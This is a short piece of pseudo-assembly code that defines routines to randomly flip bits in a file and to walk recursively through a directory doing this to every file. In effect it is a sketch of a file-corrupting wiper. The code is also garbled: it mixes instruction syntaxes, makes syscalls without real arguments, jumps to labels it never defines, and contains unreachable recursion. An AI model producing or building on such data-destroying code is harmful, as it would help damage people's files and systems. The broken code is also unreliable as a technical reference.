; Define a function to change bits in a file.
CHANGE_BITS_IN_FILE:

; Open the file.
MOV R0, filename
MOV R1, O_RDWR
MOV R2, 0
MOV R3, 0
SYSCALL ; open()

; If the file was opened successfully, then proceed.
CMP R0, #0
BEQ CHANGE_BITS_IN_FILE_ERROR

; Get the file size.
MOV R0, R0
MOV R1, 0
MOV R2, 0
MOV R3, 0
SYSCALL ; lseek()

; If the file size is greater than zero, then proceed.
CMP R0, #0
BEQ CHANGE_BITS_IN_FILE_ERROR

; Generate a random number.
MOV R0, RANDOM_NUMBER
AND R0, R0, #1

; Toggle the bit in the file.
XOR [R0], R0, [R0]

; Increment the random number generator.
ADD RANDOM_NUMBER, RANDOM_NUMBER, #1

; Loop until the end of the file is reached.
CMP R0, R3
BLT CHANGE_BITS_IN_FILE

; Close the file.
MOV R0, R0
MOV R1, 0
SYSCALL ; close()

; Return from the function.
RET

; Define a function to recursively change bits in all files and folders in a directory.
CHANGE_BITS_IN_DIRECTORY:

; Open the directory.
MOV R0, dirname
MOV R1, O_RDONLY
MOV R2, 0
MOV R3, 0
SYSCALL ; open()

; If the directory was opened successfully, then proceed.
CMP R0, #0
BEQ CHANGE_BITS_IN_DIRECTORY_ERROR

; Read the next directory entry.
MOV R0, R0
MOV R1, 0
MOV R2, 0
MOV R3, 0
SYSCALL ; readdir()

; If the end of the directory has been reached, then close the directory and return.
CMP R0, #0
BEQ CHANGE_BITS_IN_DIRECTORY_END

; Check if the directory entry is a file.
CMP [R0 + #4], S_IFREG
BNE CHANGE_BITS_IN_DIRECTORY_LOOP

; Change the bits in the file.
MOV R0, [R0]
CALL CHANGE_BITS_IN_FILE

; Continue to the next directory entry.
JMP CHANGE_BITS_IN_DIRECTORY_LOOP

; Change the bits in all files and folders in the subdirectory.
MOV R0, [R0]
CALL CHANGE_BITS_IN_DIRECTORY

; Close the directory.
MOV R0, R1
MOV R1, 0
SYSCALL ; close()
